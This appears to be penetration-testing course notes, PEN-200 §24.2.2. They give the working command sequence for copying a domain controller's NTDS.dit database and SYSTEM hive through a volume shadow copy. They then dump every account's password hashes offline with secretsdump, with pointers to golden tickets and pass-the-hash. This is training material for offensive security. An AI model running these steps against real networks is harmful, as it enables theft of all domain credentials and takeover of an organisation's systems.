# 24.2.2 — Shadow Copies (NTDS.dit extraction)

- Module: PEN-200 · 24. Lateral Movement in Active Directory
- Source: portal.offsec.com · module `lateral-movement-in-active-directory-47888` (§24.2.2)
- Code blocks: 4

> As a Domain Admin, snapshot the DC volume with **VSS** to copy the locked **NTDS.dit** AD
> database, grab the **SYSTEM** hive, and dump **every** domain credential offline. Output omitted.

## Create a shadow copy of C: (on the DC, elevated)

```cmd
vshadow.exe -nw -p C:
```

> `-nw` disables writers (faster); note the **Shadow copy device name**
> (`\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN`).

## Copy NTDS.dit out of the snapshot + save the SYSTEM hive

```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
```

```cmd
reg.exe save hklm\system c:\system.bak
```

## Dump all hashes offline (Kali)

```bash
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

> Yields NTLM hashes + Kerberos keys for every user and machine account (incl. `krbtgt` → golden
> ticket, `Administrator`). Crack them or Pass-the-Hash. Stealthier alternative to touching the DC
> repeatedly: [[22-domain-controller-synchronization]] (DCSync) pulls the same data via replication.
